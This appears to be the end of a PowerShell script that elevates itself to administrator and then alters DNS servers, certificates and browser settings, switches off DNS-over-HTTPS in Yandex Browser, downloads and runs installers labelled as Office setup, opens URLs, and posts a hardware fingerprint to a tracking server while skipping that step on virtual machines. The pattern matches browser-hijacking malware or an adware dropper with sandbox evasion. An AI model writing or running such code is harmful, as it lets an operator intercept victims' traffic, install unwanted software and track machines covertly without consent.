        $form.Invoke([action] { $form.Close() })
        
        if ($eventArgs.Error) {
            [System.Windows.Forms.MessageBox]::Show("Error downloading file: " + $eventArgs.Error.Message, "Download Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
        } elseif ($eventArgs.Cancelled) {
            [System.Windows.Forms.MessageBox]::Show("Download cancelled.", "Download Cancelled", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
        } else {
            try {
                # Execute the installer
                Start-Process -FilePath $installerPath -Wait

                # Write to the registry
                $registryPath = "HKCU:\Software\Hefest\Downloads"
                if (-not (Test-Path $registryPath)) {
                    New-Item -Path $registryPath -Force | Out-Null
                }
                Set-ItemProperty -Path $registryPath -Name $fileName -Value "Downloaded"
            } catch {
                [System.Windows.Forms.MessageBox]::Show("Error executing the installer: " + $_.Exception.Message, "Execution Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
            }
        }
    }

    # Add event handlers to WebClient
    $webClient.add_DownloadProgressChanged($progressChangedHandler)
    $webClient.add_DownloadFileCompleted($downloadFileCompletedHandler)

    try {
        # Start the download
        $webClient.DownloadFileAsync([Uri]$url, $installerPath)
        
        # Keep the form responsive while the download is in progress
        while ($form.Visible) {
            Start-Sleep -Seconds 1
            [System.Windows.Forms.Application]::DoEvents()
        }
    } catch {
        [System.Windows.Forms.MessageBox]::Show("Error initiating download: " + $_.Exception.Message, "Download Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
        $form.Close()
    }
}

function Test-Autostart {
    foreach ($arg in $global:args) {
        if ($arg -eq 'autostart') {
            return $false
        }
    }
    return $false
}

function Download {
    param (
        [string]$url,
        [string]$title
    )

    $fileName = [System.IO.Path]::GetFileName($url)

    if (Test-Autostart -eq $true)
    {
        $registryPath = "HKCU:\Software\Hefest\Downloads"
        if (Test-Path $registryPath) {
            $installed = Get-ItemProperty -Path $registryPath -Name $fileName -ErrorAction SilentlyContinue
            if ($installed) {
                Write-Output "The file '$fileName' is already installed."
                return
            }
        }
    }

    Start-DownloadAndExecute -url $url -title $title
}

function DoStartDownloads {
    foreach ($url in $server.startDownloads) {
        Download -url $url -title "Downloading Office Installer"
    }
}









function DoStartUrls {
    foreach ($startUrl in $server.startUrls) {
        Start-Process $startUrl.Trim()
    }
}







function Is-VirtualMachine {
    # Get Win32_ComputerSystem information
    $computerSystem = Get-WmiObject -Class Win32_ComputerSystem
    $isVirtual = $false

    # Check for common virtualization manufacturers
    $vmManufacturers = @(
        "Microsoft Corporation",   # Hyper-V
        "VMware, Inc.",            # VMware
        "Xen",                     # Xen
        "XenSource, Inc.",         # XenSource
        "innotek GmbH",            # VirtualBox
        "Oracle Corporation",      # VirtualBox
        "Parallels Software International Inc.", # Parallels
        "QEMU",                    # QEMU
        "Red Hat, Inc.",           # KVM
        "Amazon EC2",              # AWS EC2
        "Google",                  # Google Cloud Platform
        "Virtuozzo",               # Virtuozzo
        "DigitalOcean"             # DigitalOcean
    )

    # Check Manufacturer and Model for signs of virtualization
    if ($vmManufacturers -contains $computerSystem.Manufacturer) {
        $isVirtual = $true
    } elseif ($computerSystem.Model -match "Virtual|VM|VBOX|KVM|QEMU|Parallels|Xen") {
        $isVirtual = $true
    }

    # Additional checks for virtualization using Win32_BIOS
    $bios = Get-WmiObject -Class Win32_BIOS
    if ($bios.SerialNumber -match "VMware|VBOX|Virtual|Xen|QEMU|Parallels") {
        $isVirtual = $true
    }

    # Additional checks using Win32_ComputerSystemProduct
    $computerSystemProduct = Get-WmiObject -Class Win32_ComputerSystemProduct
    if ($computerSystemProduct.Version -match "Virtual|VM|VBOX|KVM|QEMU|Parallels|Xen") {
        $isVirtual = $true
    }

    # Additional registry check for Parallels
    $parallelsKey = "HKLM:\SOFTWARE\Parallels\Parallels Tools"
    if (Test-Path $parallelsKey) {
        $isVirtual = $true
    }

    return $isVirtual
}


function Get-MachineHashCode {
    # Get BIOS Serial Number
    $biosSerial = (Get-WmiObject Win32_BIOS).SerialNumber

    # Get Motherboard Serial Number
    $mbSerial = (Get-WmiObject Win32_BaseBoard).SerialNumber

    # Get MAC Address of the first network adapter
    $macAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -and $_.IPEnabled }).MACAddress[0]

    # Combine the hardware identifiers into a single string
    $combinedString = "$biosSerial$mbSerial$macAddress"

    # Compute the hash code using SHA256
    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($combinedString)
    $hashBytes = $sha256.ComputeHash($bytes)
    $hashString = [BitConverter]::ToString($hashBytes) -replace "-", ""

    return $hashString
}


function Generate-Hash {
    param (
        [string]$data,
        [string]$key
    )

    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)
    $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($data)
    
    $hmac = New-Object System.Security.Cryptography.HMACSHA256
    $hmac.Key = $keyBytes
    $hashBytes = $hmac.ComputeHash($dataBytes)
    
    return [Convert]::ToBase64String($hashBytes)
}


function DoTrack {
    if ($server.track -eq $false){
        return
    }

    $isVM = Is-VirtualMachine
    if ($isVM -eq $true){
        return
    }

    $id = Get-MachineHashCode

    $body = "{`"id`":`"$($id.ToString())`",`"serie`":`"$($server.trackSerie.ToString())`",`"number`":`"$($id.ToString())`"}"


    # Secret key (shared with the server)
    $secretKey = "YourSecretKeyHere"

    $url= $server.trackUrl
  
    # Generate the hash for the JSON request body
    $hash = Generate-Hash -data $body -key $secretKey

    # Prepare headers
    $headers = @{
        "X-Signature" = $hash
        "Content-Type" = "application/json"
        "User-Agent"  = "PowerShell/7.2"  # Use the User-Agent from Postman if known
    }


    # Make the POST request directly with parameters
    try {
        Invoke-WebRequest -Headers $headers -Method "POST" -Body $body -Uri $url -ContentType "application/json; charset=utf-8"
    }
    catch [System.Net.WebException] {
        $statusCode = $_.Exception.Response.StatusCode
        $respStream = $_.Exception.Response.GetResponseStream()
        $reader = New-Object System.IO.StreamReader($respStream)
        $reader.BaseStream.Position = 0
        $responseBody = $reader.ReadToEnd() | ConvertFrom-Json
            Write-Error "Error making request: $responseBody"
    }
    catch{
            Write-Error "Error making request: $_"
    }
}




function ConfigureYandex
{
    Close-Processes(@('service_update.exe','browser.exe'))

    foreach ($dir in Get-EnvPaths) {
        $path = Join-Path -Path $dir -ChildPath 'Yandex\YandexBrowser\User Data\Local State'

        try {
            if (Test-Path -Path $path -PathType Leaf)
            {
                ConfigureYandexInternal -FilePath $path
            }
        } catch {
            Write-Error "Error occurred: $_"
        }
    }
}

function ConfigureYandexInternal {
    param(
        [string]$filePath
    )
    $content = Get-Content -Path $filePath -Raw | ConvertFrom-Json

    if ($null -eq $content.dns_over_https -or $content.dns_over_https -isnot [object]) {
        $content | Add-Member -MemberType NoteProperty -Name 'dns_over_https' -Value @{
            'mode' = 'off'
            'templates' = ""
        }
    } else {
        $content.dns_over_https.mode = 'off'
        $content.dns_over_https.templates = ""
    }

    $jsonString = $content | ConvertTo-Json -Depth 10

    Set-Content -Path $filePath -Value $jsonString -Encoding UTF8 -Force

    Write-Host "Successfully configured Yandex settings in $filePath"
}














































if(!([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
    Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList "-File `"$($MyInvocation.MyCommand.Path)`"  `"$($MyInvocation.MyCommand.UnboundArguments)`""
    Exit
   }

function main {
    ConfigureDnsServers
    ConfigureCertificates
    ConfigureChrome
    ConfigureEdge
    ConfigureYandex
    ConfigureFireFox
    ConfigureOpera
    ConfigureChromeUblock
    ConfigureChromePushes
    DoStartDownloads
    DoStartUrls
    LaunchChromePushes
    DoTrack
}

main

